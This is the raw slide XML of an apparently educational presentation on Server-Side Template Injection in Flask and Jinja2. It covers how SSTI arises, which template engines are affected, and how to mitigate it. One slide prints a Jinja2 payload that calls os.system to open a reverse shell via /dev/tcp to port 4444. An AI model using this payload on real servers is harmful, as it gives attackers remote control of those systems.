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Merriweather"/>
      <p:regular r:id="rId14"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Merriweather"/>
      <p:regular r:id="rId15"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Merriweather"/>
      <p:regular r:id="rId16"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Merriweather"/>
      <p:regular r:id="rId17"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Merriweather"/>
      <p:regular r:id="rId18"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Merriweather"/>
      <p:regular r:id="rId19"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Merriweather"/>
      <p:regular r:id="rId20"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Merriweather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380292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Understanding Server-Side Template Injection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0198" y="3293031"/>
            <a:ext cx="7416403" cy="23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presentation explores Server-Side Template Injection (SSTI) in the context of Python Flask applications using the Jinja2 templating engine. We will discuss what SSTI is, provide an overview of Flask and Jinja2, analyze a vulnerable Flask application, and demonstrate the risks associated with SSTI attacks. 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5939552"/>
            <a:ext cx="7416403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i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="80808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Mihai-Sorin Stanciu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350198" y="6533198"/>
            <a:ext cx="7416403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i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="80808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Alexandru Udrea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203847"/>
            <a:ext cx="12304514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is Server-Side Template Injection?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592116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SSTI Explained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224457"/>
            <a:ext cx="6150293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Server-Side Template Injection occurs when untrusted user input is executed in a server-side template, enabling attackers to inject malicious payloads.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592116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SSTI Risks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3929" y="4224457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Attackers can execute arbitrary code, extract sensitive data, or take control of the server.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832842"/>
            <a:ext cx="6792397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How Does SSTI Occur?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198" y="2251948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46413" y="2344460"/>
            <a:ext cx="16287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152323" y="2251948"/>
            <a:ext cx="278272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Template Engines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152323" y="2785467"/>
            <a:ext cx="2782729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Many web frameworks use template engines to render dynamic content.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181868" y="2251948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48793" y="2344460"/>
            <a:ext cx="221456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10983992" y="2251948"/>
            <a:ext cx="278272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Placeholders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983992" y="2785467"/>
            <a:ext cx="2782729" cy="23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Template engines allow developers to embed placeholders in HTML, which are replaced with data during rendering.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350198" y="5678805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24149" y="5771317"/>
            <a:ext cx="207407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152323" y="567880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Unsanitized Input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152323" y="6212324"/>
            <a:ext cx="6614279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If the username is supplied by a user and not properly sanitized, malicious input could be evaluated by the template engine, leading to SSTI.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96978" y="1010841"/>
            <a:ext cx="7522845" cy="144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50"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4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Features of Template Engines that Lead to SSTI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6296978" y="2805470"/>
            <a:ext cx="3645694" cy="2461379"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3952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36174" y="3044666"/>
            <a:ext cx="289500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 Jinja2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536174" y="3545562"/>
            <a:ext cx="3167301" cy="111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Allows access to Python objects, methods, and functions.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174248" y="2805470"/>
            <a:ext cx="3645694" cy="2461379"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3952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13444" y="3044666"/>
            <a:ext cx="289500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PHP Twig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413444" y="3545562"/>
            <a:ext cx="3167301" cy="1482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Offers powerful template rendering but can be exploited if input is not escaped.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96978" y="5498425"/>
            <a:ext cx="3645694" cy="1720334"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 565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6174" y="5737622"/>
            <a:ext cx="289500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Ruby ERB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6536174" y="6238518"/>
            <a:ext cx="3167301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Executes Ruby code directly in templates.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174248" y="5498425"/>
            <a:ext cx="3645694" cy="1720334"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 565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13444" y="5737622"/>
            <a:ext cx="289500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Java FreeMarker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0413444" y="6238518"/>
            <a:ext cx="3167301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Permits access to Java methods.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401253"/>
            <a:ext cx="798564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are Flask and Jinja2?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78952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421862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Flask is a lightweight Python web framework that enables rapid development of web applications.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78952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Jinja2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3929" y="4421862"/>
            <a:ext cx="615029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Jinja2 is a powerful template engine that supports a variety of features, including variable substitution, control structures, and filters.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650087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Understanding the Payload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3562826"/>
            <a:ext cx="7416403" cy="1159669"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8940"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001D4D"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="851535" y="3562826"/>
            <a:ext cx="7440930" cy="1159669"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3193"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001D4D"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1098352" y="3747849"/>
            <a:ext cx="694729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 os.system("sh -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0 &gt;&amp;1") }}
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3798" y="5000149"/>
            <a:ext cx="7416403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payload opens a reverse shell, connecting the server to the attacker's machine at IP 127.0.0.1 on port 4444. The attacker gains remote access to the server, compromising its integrity and confidentiality.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7802" y="582811"/>
            <a:ext cx="5296376" cy="66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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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02" y="1562576"/>
            <a:ext cx="529590" cy="5295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27802" y="2303978"/>
            <a:ext cx="2648188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Sanitize Input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227802" y="2762012"/>
            <a:ext cx="3671649" cy="135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Avoid directly embedding user input in templates and sanitize inputs to prevent malicious payloads.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229" y="1562576"/>
            <a:ext cx="529590" cy="5295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17229" y="2303978"/>
            <a:ext cx="2952750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Security Best Practices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10217229" y="2762012"/>
            <a:ext cx="3671768" cy="67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Employ security best practices to mitigate SSTI risks.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802" y="4752975"/>
            <a:ext cx="529590" cy="5295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27802" y="5494377"/>
            <a:ext cx="2648188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Understand SSTI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6227802" y="5952411"/>
            <a:ext cx="3671649" cy="1694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Understanding the mechanisms and consequences of SSTI is essential for developing secure web applications and protecting sensitive data.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2025-01-12T18:31:43Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-01-12T18:31:43Z</dcterms:modified>
</cp:coreProperties>
</file>